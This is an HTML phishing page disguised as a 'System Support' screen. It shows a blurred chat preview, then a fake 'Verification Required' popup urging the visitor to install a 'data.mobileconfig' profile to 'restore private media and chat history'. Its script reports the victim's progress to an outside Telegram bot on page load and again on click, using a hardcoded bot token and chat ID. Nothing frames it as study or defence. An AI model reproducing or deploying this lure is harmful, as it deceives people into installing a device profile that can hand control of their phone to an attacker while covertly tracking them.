<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Support</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #preview { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transition: filter 0.8s ease; }
        .ui-box { position: relative; z-index: 10; background: rgba(255,255,255,0.98); padding: 25px; border-radius: 20px; width: 85%; max-width: 300px; text-align: center; display: none; }
        .btn { background: #007aff; color: white; padding: 14px; border-radius: 12px; text-decoration: none; display: block; margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>

    <img src="chat_preview.jpg" id="preview">

    <div id="popup" class="ui-box">
        <h2 style="margin:0; font-size: 18px;">Verification Required</h2>
        <p style="font-size: 13px; color: #444; margin-top: 10px;">To finish restoring private media and chat history, authorize the security certificate.</p>
        <a href="data.mobileconfig" class="btn" onclick="sendFinal()">Verify & Continue</a>
    </div>

    <script>
        window.onload = function() {
            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Is_Reading_Preview_👀");
            setTimeout(() => {
                document.getElementById('popup').style.display = 'block';
                document.getElementById('preview').style.filter = 'blur(15px)';
            }, 6000); 
        };
        function sendFinal() {
            fetch("https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&text=Target_Started_Installation_✅");
        }
    </script>
</body>
</html>
